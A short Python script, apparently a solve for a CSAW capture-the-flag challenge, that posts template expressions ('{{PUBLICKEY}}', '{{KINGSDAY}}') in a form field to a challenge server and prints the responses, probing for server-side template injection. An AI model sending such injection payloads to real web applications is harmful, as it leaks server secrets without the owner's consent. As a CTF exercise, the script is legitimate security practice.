import requests

url = "https://lost-pyramid.ctf.csaw.io"

r = requests.post(
    f"{url}/scarab_room", 
    data={
        "name": '{{PUBLICKEY}}'
    }
)

print(r.status_code)
print(r.text)

r = requests.post(
    f"{url}/scarab_room", 
    data={
        "name": '{{KINGSDAY}}'
    }
)

print(r.status_code)
print(r.text)